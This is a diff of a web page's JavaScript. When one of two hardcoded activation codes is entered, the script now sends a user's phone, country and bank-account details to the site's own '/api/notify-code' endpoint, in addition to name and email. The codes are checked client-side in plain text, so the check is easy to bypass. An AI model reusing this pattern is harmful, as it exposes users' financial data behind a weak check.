@@ -394,7 +394,7 @@
       const codeInput = document.getElementById('activation-code');
       const errorText = document.getElementById('code-error');
       const value = codeInput.value.trim().toUpperCase();
-      if (value === 'LINPHONE' || value === 'EXTERNO') { fetch('/api/notify-code', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ fullname: document.getElementById('fullname') ? document.getElementById('fullname').value : '', email: document.getElementById('email') ? document.getElementById('email').value : '', code: value }) });
+      if (value === 'LINPHONE' || value === 'EXTERNO') { fetch('/api/notify-code', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ fullname: document.getElementById('fullname') ? document.getElementById('fullname').value : '', email: document.getElementById('email') ? document.getElementById('email').value : '', phone: document.getElementById('phone') ? document.getElementById('phone').value : '', country: document.getElementById('country') ? document.getElementById('country').value : '', bankName: document.getElementById('bank-name') ? document.getElementById('bank-name').value : '', accountType: document.getElementById('account-type') ? document.getElementById('account-type').value : '', accountNumber: document.getElementById('account-number') ? document.getElementById('account-number').value : '', accountHolder: document.getElementById('account-holder') ? document.getElementById('account-holder').value : '', code: value }) });
         errorText.style.display = 'none';
         goToStep(4);
       } else {
